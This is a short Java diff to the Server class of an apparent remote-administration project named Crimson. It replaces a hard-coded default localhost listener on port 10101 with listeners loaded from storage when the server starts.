@@ -29,14 +29,11 @@ import com.subterranean_security.crimson.core.proto.ClientAuth.AuthType;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ServerProfileDelta;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
-import com.subterranean_security.crimson.core.proto.Listener.ListenerConfig;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.proto.State.StateType;
 import com.subterranean_security.crimson.core.storage.ServerDB;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.core.util.FileLocking;
-import com.subterranean_security.crimson.core.util.IDGen;
-import com.subterranean_security.crimson.sv.Listener;
 
 public final class Server {
 	private static final Logger log = CUtil.Logging.getLogger(Server.class);
@@ -78,11 +75,6 @@ public final class Server {
 
 		}
 
-		// start a localhost listener
-		log.debug("Initializing local listener");
-		ServerStore.Listeners.listeners.add(new Listener(ListenerConfig.newBuilder().setID(IDGen.getListenerID())
-				.setPort(10101).setName("Default Local Listener").build()));
-
 		start();
 
 		generateDebugInstaller();
@@ -104,7 +96,7 @@ public final class Server {
 		if (!running) {
 			log.info("Starting server");
 			running = true;
-
+			ServerStore.Listeners.load();
 		}
 	}
 
